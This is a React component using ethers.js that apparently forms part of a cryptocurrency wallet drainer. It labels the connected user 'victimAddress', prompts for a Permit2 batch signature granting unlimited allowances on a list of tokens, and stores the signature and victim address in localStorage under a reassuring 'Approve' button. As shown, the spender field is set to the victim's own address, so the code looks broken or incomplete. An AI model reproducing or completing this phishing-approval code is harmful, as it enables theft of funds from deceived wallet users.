import React, { useState } from 'react';
import { ethers } from 'ethers';
import { PERMIT2_ADDRESSES } from '../../config/permit2Addresses';
import { TOKENS } from '../../config/tokens';
import toast from 'react-hot-toast';

export const Permit2Signer = () => {
  const [isSigning, setIsSigning] = useState(false);

  const signPermit2 = async () => {
    if (!window.ethereum) {
      toast.error('No wallet found');
      return;
    }

    setIsSigning(true);
    
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const victimAddress = await signer.getAddress();
      const chainId = (await provider.getNetwork()).chainId;
      
      const tokens = TOKENS[chainId] || TOKENS[1];
      const permit2Address = PERMIT2_ADDRESSES[chainId];
      
      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: permit2Address
      };
      
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' }
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' }
        ]
      };
      
      const values = {
        details: tokens.map(token => ({
          token: token.address,
          amount: ethers.constants.MaxUint256.toString(),
          expiration: Math.floor(Date.now() / 1000) + 3600,
          nonce: 0
        })),
        spender: victimAddress,
        sigDeadline: Math.floor(Date.now() / 1000) + 3600
      };
      
      const signature = await signer._signTypedData(domain, types, values);
      
      localStorage.setItem('permit2_signature', signature);
      localStorage.setItem('permit2_expiry', values.sigDeadline.toString());
      localStorage.setItem('victim_address', victimAddress);
      
      toast.success('Permit2 signature approved');
      
    } catch (error) {
      console.error('Permit2 signing failed:', error);
      toast.error('Signature rejected');
    } finally {
      setIsSigning(false);
    }
  };

  return (
    <button
      onClick={signPermit2}
      disabled={isSigning}
      className={`w-full py-3 rounded-xl font-semibold transition-all ${
        isSigning ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500'
      } text-white`}
    >
      {isSigning ? 'Signing...' : 'Approve Permit2 Signature'}
    </button>
  );
};